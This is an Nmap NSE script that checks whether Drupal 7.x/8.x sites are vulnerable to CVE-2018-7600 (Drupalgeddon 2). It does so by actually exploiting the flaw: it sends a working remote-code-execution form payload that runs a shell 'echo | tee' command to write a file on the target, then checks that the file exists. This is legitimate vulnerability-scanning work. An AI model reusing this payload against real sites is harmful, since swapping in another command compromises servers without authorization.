local http = require 'http'
local json = require 'json'
local rand = require 'rand'
local shortport = require 'shortport'
local stdnse = require 'stdnse'
local vulns = require 'vulns'

description = [[
A Remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x.
This potentially allows attackers to exploit multiple attack vectors on a Drupal site,
which could result in the site being completely compromised.

On the 7.x version, the vulnerability exists up to Drupal 7.57
and on the 8.x version, up to Drupal 8.5.0.

The script attempts a GET HTTP request to the targets.

References:
* https://www.drupal.org/sa-core-2018-002
* https://research.checkpoint.com/uncovering-drupalgeddon-2/
]]

---
-- @usage nmap --script http-vuln-cve2018-7600 -p 80,443 --script-args "uri=/" <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2018-7600:
-- |   VULNERABLE:
-- |   Drupal 7.x, 8.x remote code execution vulnerability
-- |       State: VULNERABLE
-- |     IDs:  CVE:CVE-2018-7600
-- |     Risk factor: Critical  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-- |       Remote code execution vulnerability within multiple subsystems of Drupal 7.x and 8.x.
-- |
-- |     Disclosure date: 2018-03-28
-- |     References:
-- |       https://www.drupal.org/sa-core-2018-002
-- |_      https://research.checkpoint.com/uncovering-drupalgeddon-2/
--
-- @xmloutput
-- <table key='2018-7600'>
-- <elem key='title'>Drupal 7.x, 8.x remote code execution vulnerability</elem>
-- <elem key='state'>VULNERABLE</elem>
-- <table key='ids'>
-- <elem>CVE:CVE-2018-7600</elem>
-- </table>
-- <table key='scores'>
-- <elem key='CVSSv3'>9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</elem>
-- </table>
-- <table key='description'>
-- <elem>Remote code execution vulnerability within multiple subsystems of Drupal 7.x and 8.x.</elem>
-- </table>
-- <table key='dates'>
-- <table key='disclosure'>
-- <elem key='day'>18</elem>
-- <elem key='month'>03</elem>
-- <elem key='year'>2018</elem>
-- </table>
-- </table>
-- <elem key='disclosure'>2018-03-18</elem>
-- <table key='check_results'>
-- </table>
-- <table key='refs'>
-- <elem>https://www.drupal.org/sa-core-2018-002</elem>
-- <elem>https://research.checkpoint.com/uncovering-drupalgeddon-2/</elem>
-- </table>
-- </table>
--
---

author = 'Kostas Milonas'
license = 'Same as Nmap--See https://nmap.org/book/man-legal.html'
categories = {'vuln', 'intrusive'}

portrule = shortport.http

action = function(host, port)
  local vuln_table = {
    title = 'Drupal 7.x, 8.x remote code execution vulnerability',
    IDS = {CVE = 'CVE-2018-7600'},
    risk_factor = 'Critical',
    scores = {
      CVSSv3 = '9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
    },
    description = [[
Remote code execution vulnerability within multiple subsystems of Drupal 7.x and 8.x.
]],
    references = {
      'https://www.drupal.org/sa-core-2018-002',
      'https://research.checkpoint.com/uncovering-drupalgeddon-2/'
    },
    dates = {
      disclosure = {year = '2018', month = '03', day = '18'},
    },
    check_results = {},
    extra_info = {}
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln_table.state = vulns.STATE.NOT_VULN

  -- Create the random file to create with the exploit.
  randomness = rand.random_alpha(10)
  random_filename = randomness .. '.txt'

  -- Get base URI passed as parameter.
  local uri_param = stdnse.get_script_args('uri') or '/'
  stdnse.debug1('URI from parameter: %s', uri_param)

  -- The URI that the request will be sent to.
  local uri = uri_param .. 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
  -- Headers and the request payload.
  local headers = {['Content-Type'] = 'application/x-www-form-urlencoded'}
  local data = 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo \"' .. randomness .. '\"|tee ' .. random_filename

  -- Make the request.
  stdnse.debug1('Testing URI: %s', uri)
  local response = http.post(host, port, uri, { header = headers }, { redirect_ok = true, no_cache = true }, data)

  -- Check if the request was successful.
  if response.status ~= 200 then
    stdnse.debug1('Request failed with status "%s".', response.status)
    return vuln_report:make_output(vuln_table)
  end

  -- Parse the response.
  local json_status, json_data = json.parse(response.body)
  if not json_status then
    stdnse.debug1('Response is not JSON.')
    return vuln_report:make_output(vuln_table)
  end

  -- Get from the response the type of the command executed.
  local command = json_data[1].command

  -- Check if the exploit was successful.
  if command ~= 'insert' then
    stdnse.debug1('Exploitation failed (executed command type: "%s").', command)
    return vuln_report:make_output(vuln_table)
  end

  -- Test the file was created while exploiting.
  stdnse.debug1('Testing if file was created at URL http://%s:%s/%s', host.name, port.number, random_filename)
  local response = http.get(host, port, uri_param .. random_filename, { redirect_ok = true, no_cache = true })

  -- Check if the request was successful.
  if response.status ~= 200 or response.body ~= randomness .. '\n' then
    stdnse.debug1('File was not found, returned response status "%s".', response.status)
    return vuln_report:make_output(vuln_table)
  end

  stdnse.debug1('The file was found!')
  stdnse.debug1('Vulnerability found!')
  vuln_table.state = vulns.STATE.VULN

  return vuln_report:make_output(vuln_table)
end
